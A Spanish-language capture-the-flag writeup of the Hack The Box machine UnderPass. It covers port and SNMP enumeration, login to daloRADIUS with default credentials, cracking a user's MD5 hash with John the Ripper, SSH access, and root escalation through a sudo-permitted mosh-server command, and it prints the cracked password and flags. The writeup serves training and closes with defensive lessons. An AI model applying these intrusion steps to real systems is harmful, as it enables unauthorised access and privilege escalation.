---
title: "Writeup UnderPass"
header:
  image: /assets/images/posts/underpass/featured_image_underpass.jpg
  teaser: /assets/images/posts/underpass/featured_image_underpass.jpg
excerpt_separator: "<!--more-->"
show_date: true
last_modified_at: 2025-12-09T16:20:02-05:00
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - HackTheBox
tags:
  - UDP
  - snmp
  - gobuster
  - mosh
  - mosh-server
collection: writeups
---

En este writeup, compartiré el proceso que seguí para comprometer la máquina **UnderPass** en Hack The Box.<!--more--> A través de la enumeración SNMP, la explotación de credenciales por defecto de *daloRADIUS*, y la escalada de privilegios utilizando *mosh-server*, logré obtener ambas flags.

![alt text](/assets/images/underpass/maquina.png)

## 1. Introducción

**Dificultad:** Fácil  
**Dirección IP:** 10.10.11.48  
**Objetivo:** Obtener la bandera de usuario y la de root.  
**Herramientas utilizadas:** nmap, snmp-check, gobuster, hashid, john the ripper  

## 2. Reconocimiento Inicial

En primer lugar guardé en la variable IP la IP del sistema objetivo y comprobé la conexión al mismo.

![alt text](/assets/images/underpass/prueba_conexion.png)

### 2.1. Escaneo de Puertos con Nmap

Comencé con un escaneo de puertos para identificar los servicios activos en la máquina. Utilicé los siguientes comandos:

```bash
sudo nmap -Pn -sS 10.10.11.48 -oA scan_TCP
```
![alt text](/assets/images/underpass/scan_TCP.png)

```bash
sudo nmap -p22,80 -sSCV 10.10.11.48 -oA scan_TCP_services
```
![alt text](/assets/images/underpass/scan_TCP_services.png)

```bash
sudo nmap -sU -F 10.10.11.48 -oA scan_UDP
```
![alt text](/assets/images/underpass/scan_UDP.png)

En los resultados, detecté abiertos los puertos:

- **22 (SSH)**
- **80 (HTTP)**
- **161 (SNMP)**

## 3. Enumeración de Servicios

### 3.1. Enumeración SNMP

Al ver que el puerto 161 estaba abierto, procedí a utilizar **snmp-check** para obtener información:

```bash
snmp-check -t 10.10.11.48
```
El escaneo reveló información interesante:

- **Hostname:** UnDerPass.htb (indicando que es el único servidor *daloRADIUS* en la red).
- **Sistema:** Linux underpass 5.15.0-126-generic (Ubuntu).
- **Contacto:** steve@underpass.htb.
- **Ubicación:** Nevada, U.S.A.

![alt text](/assets/images/underpass/snmp-check.png)

### 3.2. Investigación de daloRADIUS

Dado que el escaneo SNMP reveló que el servidor ejecutaba *daloRADIUS*, busqué más información sobre esta aplicación.

![alt text](/assets/images/underpass/busqueda_daloradius.png)

 Encontré su [página en GitHub](https://github.com/lirantal/daloradius) y su [wiki de instalación](https://github.com/lirantal/daloradius/wiki/Installation).

La wiki proporcionaba credenciales por defecto:

- **Usuario:** administrator  
- **Contraseña:** radius  

![alt text](/assets/images/underpass/testing_daloradius.png)

Además, mencionaba directorios de configuración que podrían estar expuestos.

![alt text](/assets/images/underpass/config_daloradius.png)

### 3.3. Enumeración Web con Gobuster

Con esta información, ejecuté **gobuster** para buscar directorios expuestos:

```bash
gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![alt text](/assets/images/underpass/gobuster.png)

El escaneo encontró el siguiente directorio interesante:

- **/daloradius/app/operators/index.php**: Al intentar acceder, fui redirigido a un panel de login en **/daloradius/app/operators/login.php**.

### 3.4. Acceso al Panel de daloRADIUS

Probé las credenciales por defecto en el panel de login:

```
Usuario: administrator
Contraseña: radius
```

![alt text](/assets/images/underpass/panel_acceso_daloradius.png)

Para mi suerte, las credenciales funcionaron y tuve acceso al panel de administración. 

![alt text](/assets/images/underpass/dashboard_daloradius.png)

Dentro del panel, localicé la lista de usuarios y encontré un usuario llamado **svcMosh** con el siguiente hash de contraseña:

```
412DD4759978ACFCC81DEAB01B382403
```

![alt text](/assets/images/underpass/lista_usuarios_daloradius.png)

## 4. Cracking del Hash y Acceso al Sistema

### 4.1. Identificación del Hash

Utilicé **hashid** para identificar el tipo de hash:

```bash
hashid 412DD4759978ACFCC81DEAB01B382403
```

![alt text](/assets/images/underpass/identificacion_de_hash.png)

El resultado indicó que se trataba de un hash **MD5**. 

### 4.2. Cracking con John the Ripper

Con la identificación del hash, procedí a crackearlo usando **John the Ripper** y el diccionario **rockyou.txt**:

```bash
john --format=raw-md5 --wordlist=/home/kali/rockyou.txt hash.txt
```

En pocos segundos, John reveló la contraseña:

```
underwaterfriends
```

![alt text](/assets/images/underpass/john.png)

### 4.3. Acceso Vía SSH

Con las credenciales del usuario **svcMosh**, intenté conectarme al servicio SSH de la máquina:

```bash
ssh svcMosh@10.10.11.48
```

Ingresé la contraseña **underwaterfriends** y logre acceder exitosamente. 

![alt text](/assets/images/underpass/ssh.png)

### 4.4. Obtención de la Flag de Usuario

Una vez dentro, navegué hasta el directorio personal del usuario y encontré el archivo **user.txt**:

```bash
cat /home/svcMosh/user.txt
```

La flag de usuario era:

```
f7515bf03b0af43a7fd6e9fe5a872906
```

![alt text](/assets/images/underpass/user-flag.png)

## 5. Escalada de Privilegios

### 5.1. Verificación de Permisos Sudo

Para explorar posibles caminos de escalada de privilegios, comprobé los comandos que el usuario svcMosh tiene permiso para ejecutar con privilegios elevados mediante sudo. Ejecuté:

```bash
sudo -l
```

El resultado mostró que el usuario **svcMosh** podía ejecutar el comando **/usr/bin/mosh-server** sin contraseña:

```
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

![alt text](/assets/images/underpass/sudo.png)

### 5.2. Explotación de mosh-server

Revisé la ayuda de **mosh-server**

![alt text](/assets/images/underpass/mosh-help.png)

Descubrí que el parámetro `--server` permitía la ejecución de comandos arbitrarios. Aproveché esto para obtener una shell como root:

```bash
mosh --server="sudo /usr/bin/mosh-server" 127.0.0.1
```

![alt text](/assets/images/underpass/acceso-root.png)

Al ejecutar el comando, obtuve acceso root. Verifiqué mi identidad con:

```bash
id
```

La salida confirmó que ahora era **root**. 

![alt text](/assets/images/underpass/root.png)

## 6. Obtención de la Flag de Root

Comprobé el contenido de la carpeta con 

```bash
ls -lisah
```

Obtuve el fichero `root.txt` que contenía la flag de root.

![alt text](/assets/images/underpass/root-flag.png)

La flag de root era:

```
7998aa1e4a318a736bd8aa02ab54b779
```

## 7. Conclusión

El compromiso de la máquina **UnderPass** se logró combinando la enumeración SNMP y la explotación de configuraciones inseguras en *daloRADIUS*. La presencia de credenciales por defecto y el mal uso de permisos sudo en **mosh-server** facilitaron el acceso al sistema y la escalada de privilegios.

**Lecciones aprendidas:**  
- Siempre desactivar o proteger servicios como SNMP en entornos de producción.
- Cambiar las credenciales por defecto tras la instalación de cualquier software.
- Revisar cuidadosamente los permisos sudo, especialmente para comandos que pueden ser explotados para obtener acceso root.
## 8. Referencias

- [SNMP-Check Documentation](https://tools.kali.org/information-gathering/snmp-check)  
- [daloRADIUS GitHub](https://github.com/lirantal/daloradius)  
- [daloRADIUS Wiki de Instalación](https://github.com/lirantal/daloradius/wiki/Installation)  
- [Gobuster Documentation](https://github.com/OJ/gobuster)  
- [John the Ripper Documentation](https://www.openwall.com/john/)  
- [HashID Documentation](https://github.com/blackploit/hash-identifier)  
- [mosh-server Documentation](https://mosh.org/)
